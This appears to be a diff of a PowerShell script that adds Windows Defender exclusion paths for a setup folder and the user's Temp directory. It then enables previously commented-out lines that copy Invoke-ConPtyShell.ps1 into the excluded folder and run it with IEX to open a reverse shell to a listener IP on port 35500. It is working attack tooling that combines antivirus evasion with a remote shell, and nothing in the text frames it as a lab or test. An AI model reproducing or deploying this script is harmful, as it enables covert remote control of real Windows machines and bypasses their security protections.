@@ -6,10 +6,12 @@ $ListenerPort = "35500"
 $Preferences = Get-MpPreference
 $CurrExclusionPaths = $Preferences.ExclusionPath
 $TempExcl = "C:\Users\$($env:UserName)\AppData\Local\Temp"
-Set-MpPreference -ExclusionPath $CurrExclusionPaths, C:\Windows\Setup\State, $TempExcl
+if($CurrExclusionPaths -ne $null){
+    Set-MpPreference -ExclusionPath $CurrExclusionPaths, C:\Windows\Setup\State, $TempExcl
+} else {Set-MpPreference -ExclusionPath C:\Windows\Setup\State, $TempExcl}
 
 #copy connection script:
-#Copy-Item -Path Z:\Invoke-ConPtyShell.ps1 -Destination C:\Windows\Setup\State\Invoke-ConPtyShell.ps1
+Copy-Item -Path Z:\Invoke-ConPtyShell.ps1 -Destination C:\Windows\Setup\State\Invoke-ConPtyShell.ps1
 
 #run connection script:
-#IEX(IWR C:\Windows\Setup\State\Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell $ListenerIP $ListenerPort
+IEX(IWR C:\Windows\Setup\State\Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell $ListenerIP $ListenerPort
